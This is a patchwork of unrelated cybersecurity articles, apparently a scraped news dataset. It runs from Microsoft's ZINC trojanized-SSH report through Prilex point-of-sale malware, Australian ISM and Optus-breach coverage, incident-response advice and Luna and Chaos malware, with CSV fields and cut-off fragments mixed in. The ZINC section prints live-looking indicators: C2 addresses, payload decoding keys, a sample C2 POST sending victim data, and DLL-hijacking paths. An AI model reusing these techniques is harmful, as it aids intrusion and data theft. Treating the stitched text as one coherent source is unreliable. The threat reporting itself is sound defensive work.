legitimate Windows process, as shown in Figure 3. The ZetaNile implants use unique custom encryption methods or AES encryption to generate command and control (C2) HTTP requests to known compromised C2 domains. By encoding the victim information in the parameters for common keywords like gametype or bbs in the HTTP POSTs, these C2 communications can blend in with legitimate traffic. Weaponization of SSH clients Once they have established a connection with their target, ZINC operationalized malicious versions of two SSH clients, PuTTY and KiTTY, that acted as the entry vector for the ZetaNile implant. Both utilities provide terminal emulator support for different networking protocols, making them attractive programs for individuals commonly targeted by ZINC. The weaponized versions were often delivered as compressed ZIP archives or ISO files. Within that archive, the recipient is provided a ReadMe.txt and an executable file to run. As part of the evolution of ZINC’s malware development, and in an effort to evade traditional defenses, running the included executable does not drop the ZetaNile implant. For ZetaNile to be deployed, the SSH utility requires the IP provided in the ReadMe.txt file. An example of the content of that file is provided below: Server: 137[.]184[.]15[.]189 User: [redacted] Pass: [redacted] Weaponized PuTTY malware ZINC has been using trojanized PuTTY as part of its attack chain for many years, and this most recent variant establishes persistence on compromised devices by utilizing scheduled tasks. This activity was recently reported by Mandiant. The malicious PUTTY.exe is configured to install the Event Horizon malware in C:\ProgramData\colorui.dll and subsequently copy C:\Windows\System32\colorcpl.exe to C:\ProgramData\colorcpl.exe . By using DLL search order hijacking, ZINC can load the second stage malware, colurui.dll , and decode the payload with the key “0CE1241A44557AA438F27BC6D4ACA246” to be used for command and control. Upon successful connection to the C2 server, the attackers can install additional malware on the compromised device for other tasks. Lastly, persistence is established with the creation of a daily scheduled task, PackageColor , as part of the configuration for the weaponized PuTTY. ZINC accomplishes this with the following command: Figure 3. PuTTY – scheduled task as part of persistence Weaponized KiTTY malware While ZINC has utilized weaponized PuTTY for many years, ZINC has only recently expanded their capabilities to include weaponizing a fork of PuTTY called KiTTY. The executable first collects the username and hostname of the victim system and sends that information to a hardcoded IP 172[.]93[.]201[.]253 over TCP/22. Upon successful TCP connection to the server at 137[.]184[.]15[.]189, the malicious KiTTY executable then deploys the malware as %AppData%\mscoree.dll following multiple rounds of decoding. The mscoree.dll file is the embedded payload, detected as EventHorizon, in the ZetaNile malware family. Similar to ZINC’s version of PuTTY, the actor uses DLL search order hijacking to load malicious DLL files that perform tasks within the context of these legitimate Windows processes, specifically through % AppData%KiTTY%PresentationHost.exe -EmbeddingObject . Figure 4. KiTTY – DLL search order hijacking The mscoree.dll malware is modularized in such a way that, upon successful connection to the compromised C2 domain, the attackers can install additional malware on the target system as needed using the existing C2 communication, such as executing C:\ProgramData\Cisco\fixmapi.exe -s AudioEndpointBuilder to load malicious mapistub.dll from the compromised C2 server. The HTTP POST requests contain the hardcoded user agent string with misspelled “Edge”, as detailed below, and contain a unique ID for the field gametype and the hardcoded value for the field type for malware campaign tracking purposes: POST /wp-includes/php-compat/compat.php HTTP/1.1 Accept: text/* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg /100.0.1185.39 Content-Type: application/x-www-form-urlencoded Content-Length: 39 Host: olidhealth[.]com Connection: Keep-Alive Cache-Control: no-cache gametype =[UniqueId]& type = O8Akm8aV09Nw412KoWJds Weaponized TightVNC Viewer Beginning in September 2022, ZINC was observed utilizing a trojanized TightVNC Viewer that was delivered to a target alongside a weaponized SSH utility over WhatsApp. This malware has a unique PDBPath: N:\2.MyDevelopment\3.Tools_Development\4.TightVNCCustomize\Munna_Customize\tightvnc\x64\\Release\tvnviewer.pdb The weaponized versions of TightVNC Viewer often were delivered as compressed ZIP archives or job description-themed ISO files via online platforms such as WhatsApp. Within that archive, the recipient is provided a ReadMe.txt and an executable file to run. The .txt file has the following content: Platform: 2nd from the list User: [redacted] Pass: [redacted] As part of the threat actor’s latest malware technique to evade traditional defenses, the malicious TightVNC Viewer has a pre-populated list of remote hosts, and it’s configured to install the backdoor only when the user selects ec2-aet-tech.w-ada[.]amazonaws from the drop-down menu in the TightVNC Viewer, as shown in Figure 5: Figure 5. Weaponized TightVNC Viewer – user interface The malware was configured to send the username and hostname to IP 44[.]238[.]74[.]84 on TCP/22 as part of the victim check-in with the C2 and establish VNC connections to the same IP on port TCP/5900. Once a successful connection is established to the server IP, the embedded second stage DLL payload from TightVNC.exe is loaded in memory to establish C2 communication to a known compromised domain. Weaponization of Sumatra PDF reader and muPDF/Subliminal Recording installer ZINC has operationalized malicious versions of two PDF readers, Sumatra PDF and muPDF/Subliminal Recording installer, that act as the entry vector for the ZetaNile implant. This delivery mechanism is often utilized in relation to fraudulent job postings delivered to job-seeking targets in the IT and defense sector. The weaponized versions were often delivered as compressed ZIP archives. Within that archive, the recipient is provided with an executable file to run. While the malicious Sumatra PDF reader is a fully functional PDF reader that can load the malicious implant from a fake PDF, the muPDF/Subliminal Recording installer can set up the backdoor without loading any malicious PDF files. Trojanized Sumatra PDF Reader The trojanized version of Sumatra PDF Reader named SecurePDF.exe has been utilized by ZINC since at least 2019 and remains a unique ZINC tradecraft. SecurePDF.exe is a modularized loader that can install the ZetaNile implant by loading a weaponized job application themed file with a .PDF extension. The fake PDF contains a header “SPV005”, a decryption key, encrypted second stage implant payload, and encrypted decoy PDF, which is rendered in the Sumatra PDF Reader when the file is opened. Once loaded in memory, the second stage malware is configured to send the victim’s system hostname and device information using custom encoding algorithms to a C2 communication server as part of the C2 check-in process. The attackers can install additional malware onto the compromised devices using the C2 communication as needed. Figure 6. SecurePDF interface Trojanized muPDF/Subliminal Recording installer Within the trojanized version of muPDF/Subliminal Recording installer, setup.exe is configured to check if the file path ISSetupPrerequisites\Setup64.exe exists and write C:\colrctl\colorui.dll on disk after extracting the embedded executable inside setup.exe . It then copies C:\Windows\System32\ColorCpl.exe to C:\ColorCtrl\ColorCpl.exe . For the second stage malware, the malicious installer creates a new process C:\colorctrl\colorcpl.exe C3A9B30B6A313F289297C9A36730DB6D , and the argument C3A9B30B6A313F289297C9A36730DB6D gets passed on to colorui.dll as a decryption key . The DLL colorui.dll, which Microsoft is tracking as the EventHorizon malware family, is injected into C:\Windows\System\credwiz.exe or iexpress.exe to send C2 HTTP requests as part of the victim check-in process and to get an additional payload.

635124ab28e9d467ce428283,hackernew,https://thehackernews.com/2022/09/brazilian-prilex-hackers-resurfaced.html,Brazilian Prilex Hackers Resurfaced With Sophisticated Point-of-Sale Malware,Ravie Lakshmanan,2022-09-29,"A Brazilian threat actor known as Prilex has resurfaced after a year-long operational hiatus with an advanced and complex malware to steal money by means of fraudulent transactions. ""The Prilex group has shown a high level of knowledge about credit and debit card transactions, and how software used for payment processing works,"" Kaspersky researchers said . ""This enables the attackers to keep updating their tools in order to find a way to circumvent the authorization policies, allowing them to perform their attacks."" The cybercrime group emerged on the scene with ATM-focused malware attacks in the South American nation, providing it the ability to break into ATM machines to perform jackpotting – a type of attack aiming to dispense cash illegitimately – and clone thousands of credit cards to steal funds from the targeted bank's customers. Prilex's modus operandi over the years has since evolved to take advantage of processes relating to point-of-sale (PoS) software to intercept and modify communications with electronic devices such as PIN pads , which are used to facilitate payments using debit or credit cards. Known to be active since 2014, the operators are also adept at carrying out EMV replay attacks in which traffic from a legitimate EMV-based chip card transaction is captured and replayed to a payment processor like Mastercard, but with the transaction fields modified to include stolen card data. Infecting a computer with PoS software installed is a highly-targeted attack incorporating a social engineering element that allows the threat actor to deploy the malware. ""A target business may receive a call from a 'technician' who insists that the company needs to update its PoS software,"" the researchers noted. ""The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the 'technician' to install the malware."" The latest installments spotted in 2022, however, exhibit one crucial difference in that the replay attacks have been substituted with an alternative technique to illicitly cash out funds using cryptograms generated by the victim card during the in-store payment process. The method, called GHOST transactions, includes a stealer component that grabs all communications between the PoS software and the PIN pad used for reading the card during the transaction with the goal of obtaining the card information. This is subsequently transmitted to a command-and-control (C2) server, permitting the threat actor to make transactions through a fraudulent PoS device registered in the name of a fake company. Now, it's worth pointing out that EMV chip cards use what's called a cryptogram to secure cardholder data every time a transaction is made. This is done so as to validate the identity of the card and the approval from the card issuer, thereby reducing the risk of counterfeit transactions. While previous versions of Prilex circumvented these security measures by monitoring the ongoing transaction to get the cryptogram and conduct a replay attack using the collected ""signature,"" the GHOST attack requests for new EMV cryptograms that are put to use to complete the rogue transactions. Also baked into the malware is a backdoor module that's engineered to debug the PoS software behavior and make changes on the fly. Other backdoor commands authorize it to terminate processes, start and stop screen captures, download arbitrary files from the C2 server, and execute commands using CMD. Prilex is ""dealing directly with the PIN pad hardware protocol instead of using higher level APIs, doing real-time patching in target software, hooking operating system libraries, messing with replies, communications and ports, and switching from a replay-based attack to generate cryptograms for its GHOST transactions even from credit cards protected with CHIP and PIN technology,"" the researchers said.",['Malware'],0c2625bb-0252-57fd-a274-a06ded9038dc,"A Brazilian threat actor known as Prilex has resurfaced after a year-long operational hiatus with an advanced and complex malware. “The Prilex group has shown a high level of knowledge about credit and debit card transactions, and how software used for payment processing works,"" Kaspersky researchers said. “This enables the attackers to keep updating their tools in order to find a way to circumvent the authorization policies, allowing them to perform their attacks."" “A target business may receive a call from a 'technician' who insists that the company needs to update its PoS software,"" the researchers noted.

The September 15 update to the ISM marked the first time the document has been published in the OSCAL machine-readable format. First launched in June 2021, OSCAL (the Open Security Controls Assessment Language) was created by America’s National Institute for Standards and Technology. OSCAL uses JSON, XML and YAML to provide a platform for automating security assessment, auditing, and continuous monitoring. Announcing the first release, NIST said this makes “systems’ authorisation to operate processes and overall risk management easier.” The ASD said the OSCAL release “supports a standardised way for organisations to track the implementation status of controls for their systems, through user-friendly dashboards within their governance, risk and compliance tools.” An ASD spokesperson explained to iTnews that making the ISM machine-readable can help organisations: Track the implementation of controls across many systems; Maintain status information on how controls are implemented; and Monitor the assessment status of systems through user-friendly dashboards. The release also simplifies life for governance, risk and compliance vendors, the ASD spokesperson said. Compared to other ISM formats – PDF, DOCX, XLSX and XML – the OSCAL release means vendors “should be able to automatically download and ingest the ISM OSCAL format” into their tools. The language provides machine-readable representations of control catalogues, control baselines, system security plans, assessment plans, and results.

Now you and your team are in the pressure cooker: sleeping in shifts, juggling technical issues with analysis and decisions, and preparing executive briefings on your incident response progress. This is the point where incident responders are more likely to commit some of the “13 deadly sins of incident response,” as we call them, potentially grave mistakes often made in the heat of battle — mistakes that can needlessly sabotage your response efforts and give attackers the advantage. In Part 1 of our series, we focused on the first four “deadly sins,” most commonly committed while preparing for a data breach. Here in Part 2, we are past the preparation stage: An active breach is now underway, and additional mistakes are likely. We know this because we are drawing from the 100-plus years of collective incident response (IR) experience of the BlackBerry® Cybersecurity Services Incident Response Team. The Fifth Deadly Sin of Incident Response: Panicking, Cutting External Connectivity, or Wiping Systems Too Soon Although this is No. 5 on our list of IR “sins,” the top rule in incident response should always be “DO NOT PANIC.” However, this is often easier said than done. Hearing the words, “You’ve been hacked,” often creates a sense of fear. This can trigger knee-jerk reactions and a desire to fix the situation ASAP. Resist that impulse: You need to consider your next actions carefully. One of the big decisions incident response teams and CISOs may have to make is around connectivity: During an active data breach, should you disconnect the entire organization? Sometimes it is a necessary course of action — but it can also be a big mistake. In all cases, it is a decision you should make with great care. Important points to consider: If you disconnect the organization, you immediately place a huge amount of pressure on your incident responders. Before safely reconnecting to the internet, there is an expectation they will a) find every impacted system in the environment; b) analyze the activity; c) understand the malware’s behavior (and block it); and d) identify the initial intrusion vector — all while taking the necessary remediation steps to remove the attacker. You will also need to take steps to prevent the threat actor from easily re-compromising your environment — with all the inside information they managed to gather during their time inside your environment. That’s a very tall order. Depending on the size of the incident, your environment, and the resources you can bring to bear, this can represent several weeks of 24x7 work to accomplish. If the initial intrusion vector is an external-facing application, this can involve development of changes to fix a vulnerability, as well as testing, to ensure the attacker does not immediately return. Will the organization tolerate — and can your company afford — this potential downtime? It may have a significant impact on sales, clients, employees, and profit. Organizations will also need to consider the reputational risk, and carefully manage internal and external communication. If the consequences of killing connectivity are so significant, why do we sometimes see organizations choose this path? The key advantage of a complete shutdown is the effective removal of access for the external threat actor, preventing them from stealing additional data or taking destructive measures. Good visibility of what the attacker is doing, as well as intelligence on their likely end goal, helps you make informed decisions. Surgically containing the incident at “patient zero,” before lateral movement has taken place, is the ideal response when prevention has failed. As soon as the actor moves laterally and drops additional backdoors, the task becomes much harder. Multiple back doors can be a sign of an advanced persistent threat (APT) or nation-state attack. At this time, an investigator who is experienced with nation-state attacks should methodically and fully scope the incident before doing anything that alerts the threat actor that they have been discovered. On the other hand, if an organization is dealing with a human-operated ransomware attack, time is of the essence and swift action is needed. If the in-house team lacks the capability or experience to weigh the factors swiftly and make these tough decisions, sign an incident response retainer as soon as possible — preferably before a breach occurs, or at least when it is discovered. This ensures a service provider will assist within the contracted service-level agreements (SLAs) and help guide your initial response. Wiping Systems During Incident Response Another common panic reaction is to immediately reimage or wipe the affected system. This is often a default policy for any kind of commodity malware that is detected on a “system of interest.” Again, it can also be a big mistake, depending on the circumstances. In the case of a serious incident involving an APT attack, for example, valuable evidence will be destroyed by reinstalling or reimaging the infected host. Our BlackBerry IR team has observed multiple cases where an IT team thought they took the right steps by reinstalling prior to taking forensic evidence, but that decision eventually led us to an investigative dead end. In situations where a breach has just been discovered, an incident responder is typically unable to determine whether a particular host was the initial entry point, how the attackers got in, or if they used it as a pivot point to another system. If you make this error of prematurely reinstalling what you assume to be “patient zero,” hopefully you are lucky enough to have NetFlow logs , which will still help you make a “best guess” about other systems that might also have been affected. Standardized Approach to Incident Response A security team needs to have a standardized approach for the IT team to act upon and often this means going off of specific keywords. “Mimikatz,” “ Cobalt Strike ,” and “Trojan” are examples and can help you determine the gravity of a detection. Another best practice is using a combination of things: the type of server that is compromised along with keywords. Was “Trojan” detected on both a domain controller and a workstation? One of these combinations is a higher priority. There must be a clear understanding of when to take preliminary forensic evidence and when to continue with operations. If in doubt, always take forensic evidence BEFORE reimaging a system. A very good example of fitting antivirus detections into a method of relevance is Nextron's Antivirus Event Analysis Cheat Sheet. Eventually, the internal work method will depend on the security software that is in place. The document gives a particularly good overview of how a security team can determine if an event is significant, and so requires incident response activities, or whether the antivirus quarantine performed by the default endpoint protection platform (EPP) installed on the machine would be enough to mitigate the issue. As one example, finding a Mimikatz detection on your domain controller — or on any server within your environment — should trigger immediate incident response activities. It is not something an organization would typically expect to find “laying around.” However, getting a potentially unwanted program detection on a client system where the user has admin privileges might require other means to resolve the issue. The Sixth Deadly Sin of Incident Response: Trusting Your Comms Channels Communications about security incidents are often highly confidential and sensitive. The last thing you can afford to do is accidentally share your response plans with the attackers themselves. (Sounds crazy, but it happens.) Sometimes an incident might be linked to an insider threat, or the attacker has access to internal email or online collaboration tools such as Slack. Avoid committing deadly sin No. 6, where you assume normal comms channels are secure. Instead, consider the need to use out-of-band, encrypted, and trusted means of communicating between the teams handling the case. Also, on multiple occasions, our incident response team witnessed administrators using cleartext email to send credentials and other sensitive information during an incident. APT actors often have full control over email servers and have performed network surveillance to extract credentials from cleartext traffic. In one case we saw the threat actor reuse credentials created for the incident response teams’ recovery actions. It is important to realize how vulnerable unencrypted traffic can be, even internally. Based on our experience, some advanced threat actors will monitor emails from critical staff, such as administrators and C-level executives, or monitor firewall logons over unsecured protocols such as telnet. When dealing with an incident it is important to keep details on a need-to-know basis. Think about maintaining a calling tree and primarily sharing information with security staff, key administrators, and legal representatives. Even though the natural response during an incident is to quickly call for as much help as one can, we recommend you continue with daily operations to avoid alerting threat actors. Allow the incident to be handled by the dedicated team because you never know when you might be dealing with an insider threat. The Seventh Deadly Sin of Incident Response: Uploading Samples to Online Services It can be risky to upload unknown malware samples to public analysis platforms such as any.run , VirusTotal during your response, especially when dealing with an APT. This is a key point, because you may not know you are dealing with an APT at the time you upload the malware sample. Be careful what you upload, for the following reasons: APTs will monitor hashes of uploaded files on analysis sites because they often create a unique hash for every campaign or even each victim. Leaked emails from these groups reveal they actively monitored VirusTotal to know when any of their implants were uploaded — by simply querying if the file exists on the website. Malware often contains victim details, such as hardcoded proxy credentials or machine hostnames in the configuration; or when the command-and-control (C2) server that the malware is configured to use is linked to the victim itself. For example, the domain used by the attackers might be the victim’s domain name with a minor typo. The fact that an executable hash is not on a site like VirusTotal should be an indicator that it is not common, and so may warrant some additional focus. APT’s often create hashes for their tools that are unique for each campaign or client, as part of good operational security. A clear example of a threat group tracking their own hashes on VirusTotal comes from the leaked Hacking Team emails on Wikileaks. The site publishes news leaks and classified media provided by anonymous sources. According to news reports , the Hacking Team was an Italian information security company that sold offensive intrusion and surveillance capabilities. As a reference, in the Wikileaks page below see (Figure 1), you can see the user “vt@hackingteam.com” receiving a notification from VirusTotal that the hash they monitor was submitted: Figure 1 – Extract from Wikileaks – VirusTotal alert for c0966884a98d963ab50de87eca7e6e92a82bb621b1dab61a71b3e29c02ac6e36 Following that, we find a forward to the rest of the concerned Hacking Team members asking whether it is the latest version of their implant: “Questo e' roba nostra, fortunatamente solo Eset lo rileva come spyware generico (non come Davinci) e, se non vado errato, il submit viene proprio da loro. Guido puoi verificare da che cliente arriva? Domani comincia a lavorare sulla firma di eset e vediamo come si evolve la situazione: se rimane una signature isolata rilasciamo un minor upgrade, se la firma si propaga seguiamo il caso di ""leak scout"" gia' ben documentato sul documento ‘crisis procedure.’” The above translates to: “This is our stuff, fortunately only Eset detects it as spyware generic (not like Davinci) and, if I'm not mistaken, the submit comes right from them. Guido, can you check which customer it comes from? Tomorrow start working on Eset's signature and let's see how the situation: if an isolated signature remains we issue a minor upgrade, if the signature spreads let's follow the case of ‘leak scout’ already well documented on the ‘crisis procedure’ document.” This does sound like the team had a proper crisis procedure when one of their “scouts” got identified, and they are asking which “customer” (aka, a client using their proprietary intrusion tools) submitted this sample to VirusTotal. This is proof that advanced threat groups actively track online submission sites for their own implants. Once threat actors know someone detected their implant, they can either deactivate it and stop the campaign, or push out an update and attempt to keep the implant “under the radar” for as long as possible. Another interesting entry in the WikiLeaks dump is the email that was sent to an external “client” in response to a support ticket. Someone named Marco Valleri explains how a particular implant was uploaded to VirusTotal, and even provides a recommendation to stop attacking the “target” for the time being: “Vi preghiamo pertanto di non effettuare piu' alcun tentativo di infezione su questo target, di non utilizzare piu' il server FTP in questione e di dismettere l'anonymizer non appena tutti gli agenti ‘legittimi’ abbiano scaricato la nuova configurazione.” Which translates to: “We, therefore, ask you not to make any attempt to infect this target anymore, to stop using the FTP server in question, and to discard the anonymizer as soon as all the ‘legitimate’ agents have downloaded the new configuration.” This is another example that reveals something crucial: Both network defenders and threat actors look at online malware databases. It is good practice, however, to check file hashes against trusted public services to see if they are already there, and we commonly check hashes against VirusTotal when starting a new engagement. When we do this, we often see that it was uploaded for the first time only a few days earlier. On many occasions, we have discovered it was a member of the customer security team who uploaded the files while trying to research the incident. To conclude, uploading files to VirusTotal, or any other service, might have a number of undesired consequences, especially during an incident: During an APT case, the threat actor can take active measures to hide itself, or worse, become destructive, escalate exfiltration, or attempt to keep the unknown backdoors hidden for some amount of time. We have seen actors change out their backdoors to a completely different family within a short time after their malware samples were posted to public repositories, changing their TTPs in order to remain hidden. It is also common for advanced persistent threats to go dormant if they think they have been detected, in hopes of staying hidden, only to restart their activities later. If a researcher stumbles on your uploaded hash, which is likely (vendors and researchers frequently probe VirusTotal, looking for new and interesting samples), your incident might end up the subject of a public blog or news report. If a publication appears without your prior knowledge of a compromise, it may force your organization to make a public statement before you are ready. Malware you upload also might contain “personalized” configurations you should not divulge. In one example, we saw a backdoor which had a hardcoded user account configured for the company proxy. In another example, we identified polymorphic malware that added the victim’s hostname string as a sort of infection chain. So exercise caution and good judgment before you upload malware to an online portal. However, please take note: Once you confirm that there is no specific detailed information in the sample, and you are sure that the attack was fully mitigated, uploading to an online portal and providing the malware is highly encouraged. It adds to our collective threat knowledge and helps protect the rest of the community. The Eighth Deadly Sin of Incident Response: Actively Probing Command-and-Control Systems Depending on the type of attack you are experiencing, it is often risky to actively interact with command-and-control servers, such as by pinging the server in question or resolving malicious domain names. Running offensive tools against the server — even after the incident — may violate regulations in your region or the region where servers are located. Also, threat actors often abuse compromised servers belonging to innocent third parties, so any offensive action against a C2 server may technically be punishing another victim, not the perpetrator. When tools such as “nslookup” or “dig” are used to query “evilsubdomain[.]evil[.]domain,” these queries will be redirected to the DNS server that is controlling the evil[.]domain nameservers to provide the appropriate response. Some groups may be monitoring for such queries. So taking the resolving IP from any available DNS logs would be recommended instead of actively contacting DNS servers possibly controlled by the threat actors. Alternatively, use passive DNS services if logging was not in place at the time of the activity. Advanced persistent threats are known for purposefully leaving hints for reverse engineers or security analysts that tip off the threat group. A DNS canary is a fake domain left in the strings of a binary sample, purposefully inserted into malware so an unwary analyst would try to resolve the domain and see which IP it resolves to. This example is another reason why you should always research C2 server information from passive sources where possible, especially when handling an incident involving advanced attackers. The Ninth Deadly Sin of Incident Response: Failing to Understand Response Timelines Timing is critical in advanced attacks. Either the team may need to take their time — in the case of a nation-state attack that has moved laterally — or you need to act quickly, such as in the case of a ransomware attack. The speed of your response depends on the situation you are dealing with, and the team’s experience and expertise. The image below of the cybersecurity “kill chain” is an illustration of key milestones in a typical attack timeline, and understanding this sequence of events may help provide real-time visibility into your adversary’s activities — and their likely next steps. Knowing what stage of an attack an actor is engaged in, and intelligence of what their final objective may be, enables you to make good risk-based business decisions. Figure 2 — Cybersecurity “kill chain” In addition to representing the steps attackers typically take to accomplish their goals, the model provides insights the incident responder can use to determine the best course of action at a given time. When the actor is in the initial phase of the attack lifecycle (kill chain stages 1 to 4), it’s best to try to intervene as quickly as possible. If the detection is happening when the attacker is already in a later stage of the kill chain (after the lateral movement), the incident needs to be fully scoped in order to create and execute an effective remediation plan — and all interventions need to be carefully considered in advance when dealing with APTs. In our experience, APT actors do not rely on a single means of access and will always have multiple backdoors. That is why incident responders must attempt to identify all points of access during the identification or scoping phase, before taking any containment actions. This is the point where experience comes into play; having highly experienced and trusted senior incident responders to help advise you, based on their previous encounters with the same or similar groups, provides a significant advantage. They can recognize where the attackers are in their attack lifecycle, and devise the best course of action for that stage of the kill chain. Failing to identify an attacker’s full scope of access before remediating can result in a failed incident response, with advanced threat actors often laying low for a period of time after they become aware they were detected. This period of inactivity — or increased stealth — can last from a few days to several months. Then they often attempt to use secondary or tertiary backdoors to regain access and resume activities. As a first action, consider improving visibility . This preferably occurs as part of proactive preparation, before an incident is discovered, but it can be accomplished during an active incident to enable you to detect and track advanced actor activities in near real-time. Some common actions that will raise visibility are: Enable PowerShell logging across the environment Start capturing network traffic from the affected systems Install AI-driven endpoint detection and response (EDR) Conclusion The initial phase of incident response is a high-risk time for your organization. It’s also a crucial period to avoid any ""deadly sins” that can worsen the situation, and in some cases, increase the damage from an incident. In Part 3 of our series, we’ll discuss the four final deadly sins of incident response — focusing on things that could go wrong during the recovery phase after an incident. It might surprise you to learn what tends to be forgotten during recovery, and how these “sinful” omissions can sometimes lead to a harrowing game of cat-and-mouse between attackers and defenders.

The national bank said via Twitter its “aware of an SMS seeking to solicit funds and referencing a CBA bank account following the Optus data breach. We have identified and blocked this account”. The scam text message said “Optus has left security measures allowing us to access the personal information of their customers” before threatening to release further personal information unless a payment of $2000 was paid into a CBA account. iTnews understands despite the fraud text no funds have been received into the scam account to date, and none can be received now the account has been blocked. In a statement from the bank, CBA said it “has become aware” of the circulating SMS and has ""identified and blocked this account”. “We continue to work closely with the Australian Federal Police and other investigative, government and regulatory authorities to limit the impact of any fraud and scams resulting from the events over the past few days,” the bank said “In addition, we have been communicating directly with millions of our customers since the weekend with advice on keeping their accounts safe and what additional steps they can take with our help to protect themselves from cyber fraud.” The bank added customer protection includes access to SavvyShield via the Credit Savvy App, “which makes it easy to temporarily ban access to your Credit Report if you think your identity has been compromised.” In its customer communications, the bank said it “heightened our ID theft monitoring”, and its teams “have relationships with several cyber security industry groups and will continue to monitor all channels for any data and will only update you through our channels”. A CBA spokesperson told iTnews the bank is “closely monitoring developments at Optus following the reported cyber-attack on the company.” “The security of our customers banking is an absolute critical priority for us and as part of our ongoing efforts to combat fraud and scams we are in the process of sending out specific information to help protect them against the prospect of such fraudulent activity. “We also have in place dedicated teams and protective systems to actively monitor unusual or suspicious activity 24 hours a day, seven days a week. “When we suspect any such activity, we will raise our concerns with customers to confirm whether such transfers or purchases are legitimate. If customers notice any unusual transactions or activity with their banking services they should contact us immediately.” Criticism from government The federal government remains critical of Optus, particularly over Medicare numbers. Yesterday afternoon, attorney-general Mark Dreyfus told parliament “We were concerned this morning about reports that personal information from the Optus data breach apparently also includes Medicare numbers. “Medicare numbers were never notified as forming part of the breach. “Optus has a clear obligation to notify both the affected individuals and the Australian Information Commissioner when a data breach involving personal information is likely to result in serious harm. Consumers have also got a right to know exactly what individual personal information has been compromised in Optus's communications to them.” Dreyfus also told parliament the AFP was now working with the FBI as well as with state and territory police. Health minister Mark Butler followed up Dreyfus’s remarks in a Radio National interview on Wednesday morning, also criticising Optus for not including Medicare numbers in its original breach advice: “It’s deeply unfortunate that we were only notified that Medicare details were included in that data breach in the last 24 hours or so,” he said. Butler added that the government is looking at whether medicare numbers for affected customers can be replaced. According to the Sydney Morning Herald, assistant treasurer Stephen Jones has called on Optus to foot the bill for replacing peoples' passports, saying: “any cost that’s associated with replacing documents - frankly I’ve been quite pointed about this - if Optus has done the wrong thing, it shouldn’t be customers or the commonwealth government or any other government that is bearing the cost of what is at its heart a fault, a problem, a mistake, a stuff-up by Optus.” States align with NSW over driver’s licence replacement Other states have begun following NSW’s lead in making it easier for affected citizens to replace their driver’s licences. Victoria, Queensland and South Australia have gone a step further than NSW, by making licence replacement free. Queensland’s transport and main roads minister Mark Bailey made the announcement on Twitter at 5.30pm, September 27. Earlier that day, Transport and Main Roads Queensland had indicated to iTnews it was against replacing licenses, which it regards as “a highly secure identity document with a range of physical security features to prevent alteration or forgery”. TMR’s information page is here . Victoria has posted this information page for affected customers seeking new licenses. South Australians are advised to visit a Service SA office to get their licence number changed. At the time of publication, iTnews has become aware that Service NSW is having trouble coping with the volume of traffic from people wanting their driver's licence re-issued.","['afp', 'cba', 'finance', 'financeit', 'fraud', 'optus', 'scam', 'security', 'strategy', 'telco']",95ceee8b-10f8-5fb9-9ef0-e1a5a9567809," “We continue to work closely with the Australian Federal Police and other investigative, government and regulatory authorities to limit the impact of any fraud and scams resulting from the events over the past few days,” the bank said “In addition, we have been communicating directly with millions of our customers since the weekend with advice on keeping their accounts safe and what additional steps they can take with our help to protect themselves from cyber fraud.” The bank added customer protection includes access to SavvyShield via the Credit Savvy App, “which makes it easy to temporarily ban access to your Credit Report if you think"

New samples are introducing new techniques, more sophistication and anti-detection techniques to hide their detection from the cybersecurity radar. One of the most recent examples is the Luna ransomware, shortly documented by Kaspersky . The ransomware was discovered in June 2022 on underground forums, and it seems that it is in development by Russian actors. “The advertisement states that Luna only works with Russian-speaking affiliates. Also, the ransom note hardcoded inside the binary contains spelling mistakes,” says the Kaspersky research team. The ransomware has a command-line interface with simple features implemented, as observed below. Figure 1: Luna (the Russian word for moon) command line interface. Luna is developed in the Rust language, such as other notable ransomware families: Hive and BlackCat . Using the Rust language , criminals obtained a set of advantages from the detection point of view. As announced on the Rust website, it provides: A language empowering everyone to build reliable and efficient software High performance because Rust is fast and memory efficient It provides great documentation, a friendly compiler with useful error messages and top-notch tooling It is cross-platform A clear motivation from the criminals’ point of view is the cross-platform feature, as it allows the development of a ransomware piece that can be used in different operating systems, such as Windows, Linux and ESXi systems. Rust is also memory efficient, and the ransomware code does not remain static, making its detection hard, another advantage of Rust within the malware landscape. Encryption process Luna ransomware is using a not common encryption combination, taking advantage of the fast and secure X25519 elliptic curve Diffie-Hellman key exchange using Curve25519 with the Advanced Encryption Standard (AES) symmetric encryption algorithm, as mentioned by Kaspersky. The extension .luna is appended to all encrypted files during the encryption process, but the ransomware capabilities are still under development. Figure 2: Luna sample and damaged files with the .luna extension appended to the file name. An interesting detail observed during this analysis is that Luna’s source code seems to be adapted to the Russian language, probably indicating the group’s targets are not part of the former USSR (Union of Soviet Socialist Republics). Within this context and to corroborate the previous thought, the ransomware note is written in American English, with some grammatical errors probably indicating an automatic translation from another language. Figure 3: Luna ransomware note. Regarding the Linux and ESXi samples, the same source code is used to compile both versions, with minor changes performed during the build process. Understanding Luna ransomware Using exotic languages like Rust demonstrates a significant trend in the ransomware landscape. Luna is the perfect example, with the criminals’ groups developing cross-platform ransomware families to cause the highest damage during the encryption process and target different operating systems. Rust and Goland are criminals’ most popular programming languages to develop new threats. In this sense, monitoring must be in place to reduce the potential damage of a ransomware incident, as well as to spotlight the threat on the cyber security radar and thus allow a fast and efficient containment of the threat.

635124a928e9d467ce42826d,hackernew,https://thehackernews.com/2022/09/researchers-warn-of-new-go-based.html,Researchers Warn of New Go-based Malware Targeting Windows and Linux Systems,Ravie Lakshmanan,2022-09-28,"A new, multi-functional Go-based malware dubbed Chaos has been rapidly growing in volume in recent months to ensnare a wide range of Windows, Linux, small office/home office (SOHO) routers, and enterprise servers into its botnet. ""Chaos functionality includes the ability to enumerate the host environment, run remote shell commands, load additional modules, automatically propagate through stealing and brute-forcing SSH private keys, as well as launch DDoS attacks,"" researchers from Lumen's Black Lotus Labs said in a write-up shared with The Hacker News. A majority of the bots are located in Europe, specifically Italy, with other infections reported in China and the U.S., collectively representing ""hundreds of unique IP addresses"" over a one-month time period from mid-June through mid-July 2022. Written in Chinese and leveraging China-based infrastructure for command-and-control, the botnet joins a long list of malware that are designed to establish persistence for extended periods and likely abuse the foothold for nefarious purposes, such as DDoS attacks and cryptocurrency mining. If anything, the development also points to a dramatic uptick in threat actors shifting to programming languages like Go to evade detection and render reverse engineering difficult, not to mention targeting several platforms at once. Chaos (not to be confused with the ransomware builder of the same name) lives up to its name by exploiting known security vulnerabilities to gain initial access, subsequently abusing it to conduct reconnaissance and initiate lateral movement across the compromised network. What's more, the malware has versatility that similar 